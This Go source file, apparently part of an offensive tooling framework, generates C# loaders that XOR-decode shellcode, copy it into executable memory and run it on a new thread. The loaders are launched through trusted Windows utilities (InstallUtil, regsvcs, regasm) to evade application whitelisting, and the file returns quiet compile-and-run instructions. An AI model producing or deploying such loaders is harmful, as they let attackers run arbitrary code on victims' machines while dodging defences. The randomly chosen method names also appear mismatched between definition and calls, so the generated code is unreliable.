package payload

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/big"
)

type InstallUtilConfig struct {
	ShellcodeB64 string `json:"shellcode_b64" form:"shellcode_b64"`
	Technique    string `json:"technique" form:"technique"`
}

func GenerateInstallUtilAssembly(cfg InstallUtilConfig) (string, string, error) {
	scBytes, err := base64.StdEncoding.DecodeString(cfg.ShellcodeB64)
	if err != nil {
		return "", "", fmt.Errorf("invalid shellcode base64: %w", err)
	}

	technique := cfg.Technique
	if technique == "" {
		technique = "installutil"
	}

	xorKey := byte(0)
	xorKeyBig, _ := rand.Int(rand.Reader, big.NewInt(256))
	xorKey = byte(xorKeyBig.Int64())

	xored := make([]byte, len(scBytes))
	for i := range scBytes {
		xored[i] = scBytes[i] ^ xorKey
	}

	hexEncoded := hex.EncodeToString(xored)

	var className, baseClass, extraUsing string

	switch technique {
	case "regsvcs", "regasm":
		baseClass = "ServicedComponent"
		extraUsing = "using System.EnterpriseServices;\nusing System.Reflection;"
	default:
		baseClass = "Installer"
		extraUsing = "using System.Configuration.Install;\nusing System.ComponentModel;"
	}

	className = randomCSharpName()
	bufVar := randomCSharpName()
	addrVar := randomCSharpName()
	threadVar := randomCSharpName()
	xorKeyVar := randomCSharpName()

	source := fmt.Sprintf(`using System;
using System.Runtime.InteropServices;
%s

[RunInstaller(true)]
public class %s : %s
{
    public static void Main()
    {
        %s();
    }

    public static void %s()
    {
        try
        {
            byte[] %s = new byte[] { %s };
            byte %s = 0x%02x;
            for (int i = 0; i < %s.Length; i++)
            {
                %s[i] ^= %s;
            }
            IntPtr %s = VirtualAlloc(IntPtr.Zero, (UIntPtr)%s.Length, 0x1000, 0x40);
            Marshal.Copy(%s, 0, %s, %s.Length);
            IntPtr %s = CreateThread(IntPtr.Zero, 0, %s, IntPtr.Zero, 0, IntPtr.Zero);
            if (%s != IntPtr.Zero)
            {
                WaitForSingleObject(%s, 0xFFFFFFFF);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
    }

    public override void Install(System.Collections.IDictionary stateSaver)
    {
        %s();
        base.Install(stateSaver);
    }

    public override void Uninstall(string savedState)
    {
        %s();
        base.Uninstall(savedState);
    }

    public override void Commit(System.Collections.IDictionary savedState)
    {
        %s();
        base.Commit(savedState);
    }

    public override void Rollback(System.Collections.IDictionary savedState)
    {
        %s();
        base.Rollback(savedState);
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}`,
		extraUsing,
		className, baseClass,
		getShellcodeFuncName(),
		getShellcodeFuncName(),
		bufVar, hexToCSByteArray(hexEncoded),
		xorKeyVar, xorKey,
		bufVar,
		bufVar, xorKeyVar,
		addrVar, bufVar,
		bufVar, addrVar, bufVar,
		threadVar, addrVar,
		threadVar,
		threadVar,
		getShellcodeFuncName(),
		getShellcodeFuncName(),
		getShellcodeFuncName(),
		getShellcodeFuncName(),
	)

	instructions := ""
	switch technique {
	case "installutil":
		instructions = "Compile: csc.exe /reference:System.Configuration.Install.dll /out:loader.exe loader.cs\nRun: InstallUtil.exe /logfile= /quiet /U loader.exe\nor: InstallUtil.exe /logfile= /quiet loader.exe"
	case "regsvcs":
		instructions = "Compile: csc.exe /reference:System.EnterpriseServices.dll /out:loader.dll loader.cs\nRun: regsvcs.exe loader.dll"
	case "regasm":
		instructions = "Compile: csc.exe /reference:System.EnterpriseServices.dll /out:loader.dll loader.cs\nRun: regasm.exe /U loader.dll\nor: regasm.exe loader.dll"
	}

	return source, instructions, nil
}

func getShellcodeFuncName() string {
	names := []string{"ExecuteShellcode", "RunPayload", "LoadModule", "InitializeComponent", "StartService", "ProcessData", "HandleRequest"}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(names))))
	return names[n.Int64()]
}
